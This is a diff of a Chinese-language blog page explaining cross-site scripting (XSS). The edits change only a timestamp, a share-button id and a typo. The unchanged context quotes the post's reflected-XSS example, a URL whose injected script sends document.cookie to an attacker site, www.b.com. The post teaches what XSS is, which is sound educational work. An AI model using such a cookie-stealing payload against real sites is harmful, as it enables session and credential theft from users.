@@ -22,7 +22,7 @@
 <meta property="og:site_name" content="Enjoy javascript">
 <meta property="og:description" content="XSS ：跨站脚本攻击（Cross Site Scripting）。为了区别于层叠样式表（Cascading Style Sheet）的缩写 CSS，一般将其缩写为 XSS。XSS 针对一种 web 安全漏洞，该漏洞允许攻击者将恶意脚本注入到用户接收到的网页中，以完成某种不利于用户的操作。">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2018-03-27T03:24:23.000Z">
+<meta property="og:updated_time" content="2020-01-15T07:35:36.835Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="XSS 攻击原理">
 <meta name="twitter:description" content="XSS ：跨站脚本攻击（Cross Site Scripting）。为了区别于层叠样式表（Cascading Style Sheet）的缩写 CSS，一般将其缩写为 XSS。XSS 针对一种 web 安全漏洞，该漏洞允许攻击者将恶意脚本注入到用户接收到的网页中，以完成某种不利于用户的操作。">
@@ -116,7 +116,7 @@
             
             <a href="/2017/04/05/XSS/#comments" class="leave-reply">Reply</a>
             
-            <a href="javascript:void(0);" data-url="http://nanchao.win/2017/04/05/XSS/" data-id="ck5ewwjsa0003jj0bgkc6q6eg" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://nanchao.win/2017/04/05/XSS/" data-id="ck5ezryaj0003p50b5a3d1xw4" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -144,7 +144,7 @@
 &lt;/body&gt;
 &lt;/html&gt;
 </code></pre><p>当我们访问地址 <a href="http://www.a.com/index.php?content=test" target="_blank" rel="noopener">http://www.a.com/index.php?content=test</a> 时，页面输出内容就是 test。这样好像并没有什么问题，但是，如果攻击者将访问地址修改为 <a href="http://www.a.com/index.php?content=&lt;script&gt;window.open(&quot;www.b.com?param=&quot;+document.cookie)&lt;/script&gt;，" target="_blank" rel="noopener">http://www.a.com/index.php?content=&lt;script&gt;window.open(&quot;www.b.com?param=&quot;+document.cookie)&lt;/script&gt;，</a> 那么，问题就来了。当某人打开这个地址后，除了打开 <a href="http://www.a.com" target="_blank" rel="noopener">www.a.com</a> ，还会弹出一个新的窗口 <a href="http://www.b.com（攻击者的站点），并且带上他保存在本地的" target="_blank" rel="noopener">www.b.com（攻击者的站点），并且带上他保存在本地的</a> cookie，这些 cookie 很可能包含了他的用户名、密码等私密信息，而这些信息都会被攻击者获取。</p>
-<p>（当然了，安装上面步骤操作一遍，我们不一定能看到上面所说的现象，那是因为有些浏览器会自带一些保护性措施来防止这种 XSS 攻击）</p>
+<p>（当然了，按照上面步骤操作一遍，我们不一定能看到上面所说的现象，因为有些浏览器会自带一些保护性措施来防止这种 XSS 攻击）</p>
 <p>XSS 攻击大体分为以上两类：</p>
 <p><strong>① 存储式攻击</strong><br>主要出现在让用户输入数据，然后存入数据库的场景，比如留言、评论、博客日志和各类表单等。攻击者在这类页面输入恶意脚本后，若未经过滤直接入库，应用程序从数据库中读取这些“恶意脚本数据”，并在页面中发布出来，后续用户浏览此页面时就可能受到攻击。</p>
 <p><strong>② 反射型攻击</strong><br>攻击者将恶意脚本代码加入 url 地址的请求参数里，应用程序接收到请求参数后，将参数直接输入，就可能引入可执行的代码块。用户点击类似的恶意链接就可能执行此代码块，受到攻击。</p>
